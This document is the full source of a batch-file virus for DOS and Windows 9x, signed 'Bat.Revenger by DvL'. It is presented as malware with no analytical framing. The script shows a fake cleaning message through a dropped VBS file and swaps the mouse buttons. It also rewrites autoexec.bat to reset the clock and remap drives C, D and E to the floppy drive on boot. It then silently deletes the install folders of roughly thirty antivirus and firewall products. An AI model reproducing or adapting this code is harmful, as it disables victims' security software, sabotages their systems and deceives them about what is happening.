   ::
   ::                      Bat.Revenger by DvL
   ::
   ctty nul
   @echo off
   @if exist %windir%\system\rev.vbs goto start
   @echo.On Error Resume Next>%windir%\system\rev.vbs
   @echo.MsgBox "  Revenger by DvL virus was found !!!  ",4144," This will clean your computer. Wait ... ">>%windir%\system\rev.vbs
   :start
   @start %windir%\system\rev.vbs
   @type nul | choice /n /cy /ty,8 >nul
   @%windir%\rundll32.exe user,swapmousebutton
   @echo.ctty nul>c:\autoexec.bat
   @echo.@echo off>>c:\autoexec.bat
   @echo.@time 00:00:00,00>>c:\autoexec.bat
   @echo.@date 80-01-01>>c:\autoexec.bat
   @echo.@subst e: a:\>>c:\autoexec.bat
   @echo.@subst d: a:\>>c:\autoexec.bat
   @echo.@subst c: a:\>>c:\autoexec.bat
   @echo.@echo.>>c:\autoexec.bat
   @echo.@echo.>>c:\autoexec.bat
   @echo.@echo.>>c:\autoexec.bat
   @echo.@echo         É» É»   É» É»>>c:\autoexec.bat
   @echo.@echo         ºº ºÈ» É¼º ºº>>c:\autoexec.bat
   @echo.@echo         ºº È»ÈÍ¼É¼ ºº   This means that you`ve been burned by>>c:\autoexec.bat
   @echo.@echo         ºº  º   º  ºº                    DvL>>c:\autoexec.bat
   @echo.@echo         ºº  È» É¼  ºº>>c:\autoexec.bat
   @echo.@echo         È¼   ÈÍ¼   È¼>>c:\autoexec.bat
   @echo.@echo.>>c:\autoexec.bat
   @echo.@echo.>>c:\autoexec.bat
   @echo.@echo.>>c:\autoexec.bat
   @deltree/y c:\Progra~1\Norton~1\ >nul
   @deltree/y c:\Progra~1\Norton~2\ >nul
   @deltree/y c:\Progra~1\Symantec\ >nul
   @deltree/y c:\Progra~1\Common~1\Symant~1\ >nul
   @deltree/y c:\progra~1\common~1\avpsha~1\avpbases\ >nul
   @deltree/y c:\progra~1\common~1\avpsha~1\ >nul
   @deltree/y c:\progra~1\mcafee\viruss~1\ >nul
   @deltree/y c:\progra~1\mcafee\ >nul
   @deltree/y c:\Progra~1\PandaS~1\ >nul
   @deltree/y c:\Progra~1\TrendM~1\ >nul
   @deltree/y c:\Progra~1\Comman~1\ >nul
   @deltree/y c:\Progra~1\ZoneLa~1\ >nul
   @deltree/y c:\Progra~1\TinyPe~1\ >nul
   @deltree/y c:\Progra~1\Kasper~1\ >nul
   @deltree/y c:\progra~1\kasper~2\ >nul
   @deltree/y c:\Progra~1\Trojan~1\ >nul
   @deltree/y c:\Progra~1\AvPersonal\ >nul
   @deltree/y c:\Progra~1\Grisoft\ >nul
   @deltree/y c:\Progra~1\AntiVi~1\ >nul
   @deltree/y c:\Progra~1\QuickH~1\ >nul
   @deltree/y c:\progra~1\f-prot95\ >nul
   @deltree/y c:\Progra~1\FWIN32\ >nul
   @deltree/y c:\progra~1\tbav\ >nul
   @deltree/y c:\progra~1\findvi~1\ >nul
   @deltree/y c:\FindVirus\ >nul
   @deltree/y c:\esafen\ >nul
   @deltree/y c:\f-macro\ >nul
   @deltree/y c:\TBAVW95\ >nul
   @deltree/y c:\tbav\ >nul
   @deltree/y c:\VS95\ >nul
   @deltree/y c:\AntiVi~1\ >nul
   @deltree/y c:\ToolKit\FindVirus\ >nul
   @deltree/y c:\PC-Cil~1\ >nul
   cls
